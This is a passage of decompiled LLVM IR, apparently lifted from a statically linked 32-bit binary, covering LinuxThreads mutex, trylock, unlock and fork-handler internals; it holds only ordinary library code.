  br i1 %v1_8059fca, label %dec_label_pc_8059fbe, label %dec_label_pc_8059fcc

dec_label_pc_8059fcc:                             ; preds = %dec_label_pc_8059fc6
  %v0_8059fcf = load i32, i32* @edi, align 4
  store i32 %v0_8059fcf, i32* %stack_var_-60, align 4
  %v1_8059fd0 = call i32 @pthread_mutex_lock(i32 %v0_8059fcf)
  br label %dec_label_pc_8059fda

dec_label_pc_8059fda:                             ; preds = %dec_label_pc_8059ec9, %dec_label_pc_8059fcc
  %v0_8059fdd = phi i32 [ 22, %dec_label_pc_8059ec9 ], [ 0, %dec_label_pc_8059fcc ]
  %v2_8059fdf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059fdf, i32* @ebx, align 4
  store i32 %v0_8059eaa, i32* @esi, align 4
  store i32 %v0_8059ea9, i32* @edi, align 4
  ret i32 %v0_8059fdd

; uselistorder directives
  uselistorder i8* %v2_8059eea, { 1, 0, 2 }
  uselistorder i32 %v3_8059ebd, { 1, 0 }
  uselistorder i32 %v2_8059eaf, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 10, 12, 11, 13, 0 }
  uselistorder i32 %v4_8059eab, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 2, 0, 1 }
  uselistorder i32 ()* @suspend.18, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.15, { 2, 1, 0 }
  uselistorder i32 134585515, { 1, 0 }
  uselistorder i32 441, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059fda, { 1, 0 }
  uselistorder label %dec_label_pc_8059fc6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059fb3, { 1, 0 }
  uselistorder label %dec_label_pc_8059f67, { 1, 0 }
  uselistorder label %dec_label_pc_8059f27, { 1, 0 }
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_805a031 = load i32, i32* @eax, align 4
  ret i32 %v0_805a031
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_805a038 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_805a038, i32* %ebx.global-to-local, align 4
  %v2_805a03d = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_805a047 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_805a0669 = icmp eq i32 %storemerge8, 0
  %v1_805a06c11 = icmp eq i1 %v1_805a0669, false
  br i1 %v1_805a06c11, label %dec_label_pc_805a054, label %dec_label_pc_805a06e

dec_label_pc_805a054:                             ; preds = %entry, %dec_label_pc_805a054
  %storemerge12 = phi i32 [ %storemerge, %dec_label_pc_805a054 ], [ %storemerge8, %entry ]
  %v1_805a057 = add i32 %storemerge12, 56
  %v3_805a05b = call i32 @pthread_mutex_init(i32 %v1_805a057, i32* nonnull %stack_var_-8)
  %v0_805a060 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a060 = add i32 %v0_805a060, 32
  %v2_805a060 = inttoptr i32 %v1_805a060 to i32*
  %storemerge = load i32, i32* %v2_805a060, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_805a066 = icmp eq i32 %storemerge, 0
  %v1_805a06c = icmp eq i1 %v1_805a066, false
  br i1 %v1_805a06c, label %dec_label_pc_805a054, label %dec_label_pc_805a06e

dec_label_pc_805a06e:                             ; preds = %dec_label_pc_805a054, %entry
  %v1_805a072 = call i32 @pthread_mutexattr_destroy(i32 %v2_805a038)
  ret i32 %v1_805a072

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a054, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a07c = load i32, i32* @ebx, align 4
  store i32 %v0_805a07c, i32* %stack_var_-4, align 4
  %v0_805a07d = load i32, i32* @eax, align 4
  store i32 %v0_805a07d, i32* %ecx.global-to-local, align 4
  %v1_805a08211 = inttoptr i32 %v0_805a07d to i32*
  %v2_805a08212 = load i32, i32* %v1_805a08211, align 4
  %v3_805a08213 = icmp eq i32 %v2_805a08212, 0
  br i1 %v3_805a08213, label %dec_label_pc_805a08e, label %dec_label_pc_805a0a4.loopexit

dec_label_pc_805a08e:                             ; preds = %entry, %dec_label_pc_805a08e.dec_label_pc_805a082_crit_edge
  %v1_805a08214 = phi i32* [ %v1_805a082, %dec_label_pc_805a08e.dec_label_pc_805a082_crit_edge ], [ %v1_805a08211, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805a097 = load i32, i32* %v1_805a08214, align 4
  %v15_805a097 = icmp eq i32 %v2_805a097, 0
  %v22_805a097 = select i1 %v15_805a097, i32 1, i32 %v2_805a097
  store i32 %v22_805a097, i32* %v1_805a08214, align 4
  %v1_805a09b = zext i1 %v15_805a097 to i32
  %v2_805a09b = load i32, i32* %edx.global-to-local, align 4
  %v3_805a09b = and i32 %v2_805a09b, -256
  %v4_805a09b = or i32 %v3_805a09b, %v1_805a09b
  store i32 %v4_805a09b, i32* %edx.global-to-local, align 4
  %v4_805a09e = icmp eq i1 %v15_805a097, false
  br i1 %v4_805a09e, label %dec_label_pc_805a08e.dec_label_pc_805a082_crit_edge, label %dec_label_pc_805a0a2

dec_label_pc_805a08e.dec_label_pc_805a082_crit_edge: ; preds = %dec_label_pc_805a08e
  %v0_805a082.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a082 = inttoptr i32 %v0_805a082.pre to i32*
  %v2_805a082 = load i32, i32* %v1_805a082, align 4
  %v3_805a082 = icmp eq i32 %v2_805a082, 0
  br i1 %v3_805a082, label %dec_label_pc_805a08e, label %dec_label_pc_805a0a4.loopexit

dec_label_pc_805a0a2:                             ; preds = %dec_label_pc_805a08e
  br label %dec_label_pc_805a0a4

dec_label_pc_805a0a4.loopexit:                    ; preds = %dec_label_pc_805a08e.dec_label_pc_805a082_crit_edge, %entry
  br label %dec_label_pc_805a0a4

dec_label_pc_805a0a4:                             ; preds = %dec_label_pc_805a0a4.loopexit, %dec_label_pc_805a0a2
  %storemerge = phi i32 [ 16, %dec_label_pc_805a0a4.loopexit ], [ 0, %dec_label_pc_805a0a2 ]
  %v2_805a0a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a0a4, i32* @edx, align 4
  %v2_805a0a5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a0a5, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_805a082, { 1, 0 }
  uselistorder i1 %v15_805a097, { 1, 0, 2 }
  uselistorder i32 %v2_805a097, { 1, 0 }
  uselistorder i32* %v1_805a08214, { 1, 0 }
  uselistorder label %dec_label_pc_805a08e, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a0a7 = load i32, i32* @ebx, align 4
  store i32 %v0_805a0a7, i32* %stack_var_-4, align 4
  %v0_805a0a8 = load i32, i32* @eax, align 4
  store i32 %v0_805a0a8, i32* %ecx.global-to-local, align 4
  %v1_805a0ad11 = inttoptr i32 %v0_805a0a8 to i32*
  %v2_805a0ad12 = load i32, i32* %v1_805a0ad11, align 4
  %v3_805a0ad13 = icmp eq i32 %v2_805a0ad12, 0
  br i1 %v3_805a0ad13, label %dec_label_pc_805a0b9, label %dec_label_pc_805a0cf.loopexit

dec_label_pc_805a0b9:                             ; preds = %entry, %dec_label_pc_805a0b9.dec_label_pc_805a0ad_crit_edge
  %v1_805a0ad14 = phi i32* [ %v1_805a0ad, %dec_label_pc_805a0b9.dec_label_pc_805a0ad_crit_edge ], [ %v1_805a0ad11, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805a0c2 = load i32, i32* %v1_805a0ad14, align 4
  %v15_805a0c2 = icmp eq i32 %v2_805a0c2, 0
  %v22_805a0c2 = select i1 %v15_805a0c2, i32 1, i32 %v2_805a0c2
  store i32 %v22_805a0c2, i32* %v1_805a0ad14, align 4
  %v1_805a0c6 = zext i1 %v15_805a0c2 to i32
  %v2_805a0c6 = load i32, i32* %edx.global-to-local, align 4
  %v3_805a0c6 = and i32 %v2_805a0c6, -256
  %v4_805a0c6 = or i32 %v3_805a0c6, %v1_805a0c6
  store i32 %v4_805a0c6, i32* @edx, align 4
  %v4_805a0c9 = icmp eq i1 %v15_805a0c2, false
  br i1 %v4_805a0c9, label %dec_label_pc_805a0b9.dec_label_pc_805a0ad_crit_edge, label %dec_label_pc_805a0cd

dec_label_pc_805a0b9.dec_label_pc_805a0ad_crit_edge: ; preds = %dec_label_pc_805a0b9
  %v0_805a0ad.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a0ad = inttoptr i32 %v0_805a0ad.pre to i32*
  %v2_805a0ad = load i32, i32* %v1_805a0ad, align 4
  %v3_805a0ad = icmp eq i32 %v2_805a0ad, 0
  br i1 %v3_805a0ad, label %dec_label_pc_805a0b9, label %dec_label_pc_805a0cf.loopexit

dec_label_pc_805a0cd:                             ; preds = %dec_label_pc_805a0b9
  br label %dec_label_pc_805a0cf

dec_label_pc_805a0cf.loopexit:                    ; preds = %dec_label_pc_805a0b9.dec_label_pc_805a0ad_crit_edge, %entry
  br label %dec_label_pc_805a0cf

dec_label_pc_805a0cf:                             ; preds = %dec_label_pc_805a0cf.loopexit, %dec_label_pc_805a0cd
  %storemerge = phi i32 [ 16, %dec_label_pc_805a0cf.loopexit ], [ 0, %dec_label_pc_805a0cd ]
  %v2_805a0cf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a0cf, i32* %ecx.global-to-local, align 4
  %v2_805a0d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a0d0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_805a0ad, { 1, 0 }
  uselistorder i1 %v15_805a0c2, { 1, 0, 2 }
  uselistorder i32 %v2_805a0c2, { 1, 0 }
  uselistorder i32* %v1_805a0ad14, { 1, 0 }
  uselistorder label %dec_label_pc_805a0b9, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  store i32 %tmp3, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_805a0df = icmp eq i32* %arg2, null
  %v1_805a0e1 = add i32 %arg1, 16
  %v2_805a0e1 = inttoptr i32 %v1_805a0e1 to i32*
  store i32 0, i32* %v2_805a0e1, align 4
  %v0_805a0e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805a0e8 = add i32 %v0_805a0e8, 20
  %v2_805a0e8 = inttoptr i32 %v1_805a0e8 to i32*
  store i32 0, i32* %v2_805a0e8, align 4
  br i1 %v1_805a0df, label %entry.dec_label_pc_805a0f3_crit_edge, label %dec_label_pc_805a0f1

entry.dec_label_pc_805a0f3_crit_edge:             ; preds = %entry
  %v0_805a0f3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805a0f3

dec_label_pc_805a0f1:                             ; preds = %entry
  %v2_805a0f1 = load i32, i32* %arg2, align 4
  store i32 %v2_805a0f1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805a0f3

dec_label_pc_805a0f3:                             ; preds = %entry.dec_label_pc_805a0f3_crit_edge, %dec_label_pc_805a0f1
  %v0_805a0f3 = phi i32 [ %v0_805a0f3.pre, %entry.dec_label_pc_805a0f3_crit_edge ], [ %v2_805a0f1, %dec_label_pc_805a0f1 ]
  %v1_805a0f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_805a0f3 = add i32 %v1_805a0f3, 12
  %v3_805a0f3 = inttoptr i32 %v2_805a0f3 to i32*
  store i32 %v0_805a0f3, i32* %v3_805a0f3, align 4
  %v0_805a0f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_805a0f6 = add i32 %v0_805a0f6, 4
  %v2_805a0f6 = inttoptr i32 %v1_805a0f6 to i32*
  store i32 0, i32* %v2_805a0f6, align 4
  %v0_805a0fd = load i32, i32* %eax.global-to-local, align 4
  %v1_805a0fd = add i32 %v0_805a0fd, 8
  %v2_805a0fd = inttoptr i32 %v1_805a0fd to i32*
  store i32 0, i32* %v2_805a0fd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805a0f3, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_805a153 = icmp ugt i32 %arg2, 3
  br i1 %v6_805a153, label %dec_label_pc_805a15d, label %dec_label_pc_805a155

dec_label_pc_805a155:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_805a15d

dec_label_pc_805a15d:                             ; preds = %entry, %dec_label_pc_805a155
  %v0_805a15d = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_805a155 ]
  ret i32 %v0_805a15d

; uselistorder directives
  uselistorder label %dec_label_pc_805a15d, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_805a19a = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_807b63c.675 to i32), i32* null)
  %v3_805a1a6 = call i32 @pthread_cond_init(i32* nonnull @global_var_807b654.676, i32 0)
  %v0_805a1ab = load i32, i32* @global_var_807b660.677, align 32
  %v1_805a1b3 = add i32 %v0_805a1ab, -2147483643
  %v6_805a1b3 = sub i32 2147483642, %v0_805a1ab
  %v7_805a1b3 = and i32 %v6_805a1b3, %v0_805a1ab
  %v8_805a1b3 = icmp slt i32 %v7_805a1b3, 0
  %v9_805a1b3 = icmp eq i32 %v1_805a1b3, 0
  %v10_805a1b3 = icmp slt i32 %v1_805a1b3, 0
  %v3_805a1b8 = icmp eq i1 %v10_805a1b3, %v8_805a1b3
  %v4_805a1b8 = icmp eq i1 %v9_805a1b3, false
  %v5_805a1b8 = and i1 %v4_805a1b8, %v3_805a1b8
  br i1 %v5_805a1b8, label %dec_label_pc_805a1ce, label %dec_label_pc_805a1ba

dec_label_pc_805a1ba:                             ; preds = %entry
  %v1_805a1ba = add i32 %v0_805a1ab, 4
  br label %dec_label_pc_805a1ce

dec_label_pc_805a1ce:                             ; preds = %entry, %dec_label_pc_805a1ba
  %storemerge = phi i32 [ %v1_805a1ba, %dec_label_pc_805a1ba ], [ 0, %entry ]
  %v0_805a1d1 = phi i32 [ %v1_805a1ba, %dec_label_pc_805a1ba ], [ %v0_805a1ab, %entry ]
  store i32 %storemerge, i32* @global_var_807b660.677, align 32
  ret i32 %v0_805a1d1

; uselistorder directives
  uselistorder i32 %v1_805a1b3, { 1, 0 }
  uselistorder i32 %v0_805a1ab, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_805a1ce, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_805a1d2 = load i32, i32* @esp, align 4
  %v1_805a1d2 = load i32, i32* @global_var_807b620.613, align 32
  %v7_805a1d2 = icmp ult i32 %v0_805a1d2, %v1_805a1d2
  %v1_805a1d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805a1d8, i32* @edx, align 4
  %v1_805a1df = icmp eq i1 %v7_805a1d2, false
  br i1 %v1_805a1df, label %dec_label_pc_805a210, label %dec_label_pc_805a1e1

dec_label_pc_805a1e1:                             ; preds = %entry
  %v1_805a1e1 = load i32, i32* @global_var_807b624.614, align 4
  %v7_805a1e1 = icmp ult i32 %v0_805a1d2, %v1_805a1e1
  br i1 %v7_805a1e1, label %dec_label_pc_805a1f6, label %dec_label_pc_805a1e9

dec_label_pc_805a1e9:                             ; preds = %dec_label_pc_805a1e1
  %v1_805a1e9 = load i32, i32* @global_var_807b628.615, align 8
  %v7_805a1e9 = icmp ult i32 %v0_805a1d2, %v1_805a1e9
  br i1 %v7_805a1e9, label %dec_label_pc_805a210, label %dec_label_pc_805a1f6

dec_label_pc_805a1f6:                             ; preds = %dec_label_pc_805a1e9, %dec_label_pc_805a1e1
  %v0_805a1f6 = load i32, i32* @global_var_807f100.617, align 256
  %v1_805a1f6 = icmp eq i32 %v0_805a1f6, 0
  br i1 %v1_805a1f6, label %dec_label_pc_805a204, label %dec_label_pc_805a1ff

dec_label_pc_805a1ff:                             ; preds = %dec_label_pc_805a1f6
  %v0_805a1ff = call i32 @__pthread_find_self()
  br label %dec_label_pc_805a204

dec_label_pc_805a204:                             ; preds = %dec_label_pc_805a1f6, %dec_label_pc_805a1ff
  %v3_805a204 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_805a204, i32* @edx, align 4
  %v2_805a20a = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805a210

dec_label_pc_805a210:                             ; preds = %dec_label_pc_805a1e9, %entry, %dec_label_pc_805a204
  %v0_805a210 = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_805a1e9 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_805a20a, %dec_label_pc_805a204 ]
  ret i32 %v0_805a210

; uselistorder directives
  uselistorder i32* @global_var_80748c0, { 1, 0 }
  uselistorder i32 ()* @__pthread_find_self, { 2, 7, 3, 6, 1, 5, 4, 0 }
  uselistorder label %dec_label_pc_805a210, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a204, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a211 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a219 = add i32 %arg1, 12
  %v2_805a219 = inttoptr i32 %v1_805a219 to i32*
  %v3_805a219 = load i32, i32* %v2_805a219, align 4
  %v1_805a21c = add i32 %v3_805a219, -1
  %v5_805a21c = icmp eq i32 %v3_805a219, 0
  %v9_805a21c = icmp eq i32 %v1_805a21c, 0
  br i1 %v9_805a21c, label %dec_label_pc_805a23a, label %dec_label_pc_805a221

dec_label_pc_805a221:                             ; preds = %entry
  %v10_805a21c = icmp slt i32 %v1_805a21c, 0
  %v6_805a21c = sub i32 0, %v3_805a219
  %v7_805a21c = and i32 %v3_805a219, %v6_805a21c
  %v8_805a21c = icmp slt i32 %v7_805a21c, 0
  %v3_805a221 = icmp eq i1 %v10_805a21c, %v8_805a21c
  br i1 %v3_805a221, label %dec_label_pc_805a229, label %dec_label_pc_805a223

dec_label_pc_805a223:                             ; preds = %dec_label_pc_805a221
  br i1 %v5_805a21c, label %dec_label_pc_805a25a, label %dec_label_pc_805a233

dec_label_pc_805a229:                             ; preds = %dec_label_pc_805a221
  %v9_805a229 = icmp eq i32 %v3_805a219, 2
  br i1 %v9_805a229, label %dec_label_pc_805a26d, label %dec_label_pc_805a22e

dec_label_pc_805a22e:                             ; preds = %dec_label_pc_805a229
  %v9_805a22e = icmp eq i32 %v3_805a219, 3
  br i1 %v9_805a22e, label %dec_label_pc_805a284, label %dec_label_pc_805a233

dec_label_pc_805a233:                             ; preds = %dec_label_pc_805a223, %dec_label_pc_805a22e
  br label %dec_label_pc_805a297

dec_label_pc_805a23a:                             ; preds = %entry
  %v1_805a23a = call i32 @thread_self.19(i32 %v0_805a211)
  %v0_805a23f = load i32, i32* @ebx, align 4
  %v1_805a23f = add i32 %v0_805a23f, 8
  %v2_805a23f = inttoptr i32 %v1_805a23f to i32*
  %v3_805a23f = load i32, i32* %v2_805a23f, align 4
  %v15_805a23f = icmp eq i32 %v3_805a23f, %v1_805a23a
  %v1_805a242 = icmp eq i1 %v15_805a23f, false
  br i1 %v1_805a242, label %dec_label_pc_805a292, label %dec_label_pc_805a244

dec_label_pc_805a244:                             ; preds = %dec_label_pc_805a23a
  %v1_805a244 = add i32 %v0_805a23f, 4
  %v2_805a244 = inttoptr i32 %v1_805a244 to i32*
  %v3_805a244 = load i32, i32* %v2_805a244, align 4
  %tmp12 = icmp slt i32 %v3_805a244, 1
  br i1 %tmp12, label %dec_label_pc_805a253, label %dec_label_pc_805a24b

dec_label_pc_805a24b:                             ; preds = %dec_label_pc_805a244
  %v1_805a24b = add i32 %v3_805a244, -1
  store i32 %v1_805a24b, i32* %v2_805a244, align 4
  br label %dec_label_pc_805a297

dec_label_pc_805a253:                             ; preds = %dec_label_pc_805a244
  store i32 0, i32* %v2_805a23f, align 4
  %v0_805a25d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a25a

dec_label_pc_805a25a:                             ; preds = %dec_label_pc_805a223, %dec_label_pc_805a253
  %v0_805a25d = phi i32 [ %arg1, %dec_label_pc_805a223 ], [ %v0_805a25d.pre, %dec_label_pc_805a253 ]
  %v1_805a25d = add i32 %v0_805a25d, 16
  %v1_805a261 = inttoptr i32 %v1_805a25d to i32*
  %v2_805a261 = call i32 @__pthread_unlock(i32* %v1_805a261)
  br label %dec_label_pc_805a266

dec_label_pc_805a266:                             ; preds = %dec_label_pc_805a284, %dec_label_pc_805a25a
  br label %dec_label_pc_805a297

dec_label_pc_805a26d:                             ; preds = %dec_label_pc_805a229
  %v1_805a26d = call i32 @thread_self.19(i32 %v0_805a211)
  %v0_805a272 = load i32, i32* @ebx, align 4
  %v1_805a272 = add i32 %v0_805a272, 8
  %v2_805a272 = inttoptr i32 %v1_805a272 to i32*
  %v3_805a272 = load i32, i32* %v2_805a272, align 4
  %v15_805a272 = icmp eq i32 %v3_805a272, %v1_805a26d
  %v1_805a275 = icmp eq i1 %v15_805a272, false
  br i1 %v1_805a275, label %dec_label_pc_805a292, label %dec_label_pc_805a277

dec_label_pc_805a277:                             ; preds = %dec_label_pc_805a26d
  %v1_805a277 = add i32 %v0_805a272, 16
  %v2_805a277 = inttoptr i32 %v1_805a277 to i32*
  %v3_805a277 = load i32, i32* %v2_805a277, align 4
  %v4_805a277 = icmp eq i32 %v3_805a277, 0
  br i1 %v4_805a277, label %dec_label_pc_805a292, label %dec_label_pc_805a27d

dec_label_pc_805a27d:                             ; preds = %dec_label_pc_805a277
  store i32 0, i32* %v2_805a272, align 4
  %v0_805a287.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a284

dec_label_pc_805a284:                             ; preds = %dec_label_pc_805a22e, %dec_label_pc_805a27d
  %v0_805a287 = phi i32 [ %arg1, %dec_label_pc_805a22e ], [ %v0_805a287.pre, %dec_label_pc_805a27d ]
  %v1_805a287 = add i32 %v0_805a287, 16
  %v1_805a28b = inttoptr i32 %v1_805a287 to i32*
  %v2_805a28b = call i32 @__pthread_alt_unlock(i32* %v1_805a28b)
  br label %dec_label_pc_805a266

dec_label_pc_805a292:                             ; preds = %dec_label_pc_805a277, %dec_label_pc_805a26d, %dec_label_pc_805a23a
  br label %dec_label_pc_805a297

dec_label_pc_805a297:                             ; preds = %dec_label_pc_805a266, %dec_label_pc_805a24b, %dec_label_pc_805a233, %dec_label_pc_805a292
  %v0_805a29a = phi i32 [ 0, %dec_label_pc_805a266 ], [ 0, %dec_label_pc_805a24b ], [ 22, %dec_label_pc_805a233 ], [ 1, %dec_label_pc_805a292 ]
  store i32 %v0_805a211, i32* @ebx, align 4
  ret i32 %v0_805a29a

; uselistorder directives
  uselistorder i32 %v3_805a244, { 1, 0 }
  uselistorder i32 %v1_805a21c, { 1, 0 }
  uselistorder i32 %v3_805a219, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805a211, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 7, 1, 0, 2, 5, 3, 4, 6 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805a297, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805a284, { 1, 0 }
  uselistorder label %dec_label_pc_805a25a, { 1, 0 }
  uselistorder label %dec_label_pc_805a233, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_805a2a3 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  ret i32 %v1_805a2a3
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805a2ac = load i32, i32* @edi, align 4
  %v0_805a2ad = load i32, i32* @esi, align 4
  %v0_805a2ae = load i32, i32* @ebx, align 4
  store i32 %v0_805a2ae, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a2b3 = add i32 %arg1, 12
  %v2_805a2b3 = inttoptr i32 %v1_805a2b3 to i32*
  %v3_805a2b3 = load i32, i32* %v2_805a2b3, align 4
  %v1_805a2b6 = add i32 %v3_805a2b3, -1
  %v5_805a2b6 = icmp eq i32 %v3_805a2b3, 0
  %v9_805a2b6 = icmp eq i32 %v1_805a2b6, 0
  br i1 %v9_805a2b6, label %dec_label_pc_805a2df, label %dec_label_pc_805a2bb

dec_label_pc_805a2bb:                             ; preds = %entry
  %v10_805a2b6 = icmp slt i32 %v1_805a2b6, 0
  %v6_805a2b6 = sub i32 0, %v3_805a2b3
  %v7_805a2b6 = and i32 %v3_805a2b3, %v6_805a2b6
  %v8_805a2b6 = icmp slt i32 %v7_805a2b6, 0
  %v3_805a2bb = icmp eq i1 %v10_805a2b6, %v8_805a2b6
  br i1 %v3_805a2bb, label %dec_label_pc_805a2c3, label %dec_label_pc_805a2bd

dec_label_pc_805a2bd:                             ; preds = %dec_label_pc_805a2bb
  br i1 %v5_805a2b6, label %dec_label_pc_805a2d4, label %dec_label_pc_805a2cd

dec_label_pc_805a2c3:                             ; preds = %dec_label_pc_805a2bb
  %v9_805a2c3 = icmp eq i32 %v3_805a2b3, 2
  br i1 %v9_805a2c3, label %dec_label_pc_805a30c, label %dec_label_pc_805a2c8

dec_label_pc_805a2c8:                             ; preds = %dec_label_pc_805a2c3
  %v9_805a2c8 = icmp eq i32 %v3_805a2b3, 3
  br i1 %v9_805a2c8, label %dec_label_pc_805a324, label %dec_label_pc_805a2cd

dec_label_pc_805a2cd:                             ; preds = %dec_label_pc_805a2bd, %dec_label_pc_805a2c8
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_805a32f

dec_label_pc_805a2d4:                             ; preds = %dec_label_pc_805a2bd
  %v1_805a2d4 = add i32 %arg1, 16
  store i32 %v1_805a2d4, i32* @eax, align 4
  store i32 %v0_805a2ae, i32* @ebx, align 4
  %v3_805a2da = call i32 @__pthread_trylock(i32 %v0_805a2ae, i32 %v0_805a2ad, i32 %v0_805a2ac)
  %v0_805a2df.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805a2df

dec_label_pc_805a2df:                             ; preds = %entry, %dec_label_pc_805a2d4
  %v0_805a2df = phi i32 [ %v0_805a2ae, %entry ], [ %v0_805a2df.pre, %dec_label_pc_805a2d4 ]
  %v1_805a2df = call i32 @thread_self.19(i32 %v0_805a2df)
  %v0_805a2e4 = load i32, i32* @ebx, align 4
  %v1_805a2e4 = add i32 %v0_805a2e4, 8
  %v2_805a2e4 = inttoptr i32 %v1_805a2e4 to i32*
  %v3_805a2e4 = load i32, i32* %v2_805a2e4, align 4
  %v15_805a2e4 = icmp eq i32 %v3_805a2e4, %v1_805a2df
  store i32 %v1_805a2df, i32* %edi.global-to-local, align 4
  %v1_805a2e9 = icmp eq i1 %v15_805a2e4, false
  br i1 %v1_805a2e9, label %dec_label_pc_805a2f2, label %dec_label_pc_805a2eb

dec_label_pc_805a2eb:                             ; preds = %dec_label_pc_805a2df
  %v1_805a2eb = add i32 %v0_805a2e4, 4
  %v2_805a2eb = inttoptr i32 %v1_805a2eb to i32*
  %v3_805a2eb = load i32, i32* %v2_805a2eb, align 4
  %v4_805a2eb = add i32 %v3_805a2eb, 1
  store i32 %v4_805a2eb, i32* %v2_805a2eb, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805a32f

dec_label_pc_805a2f2:                             ; preds = %dec_label_pc_805a2df
  %v1_805a2f2 = add i32 %v0_805a2e4, 16
  store i32 %v1_805a2f2, i32* @eax, align 4
  %v0_805a2f5 = load i32, i32* %stack_var_-12, align 4
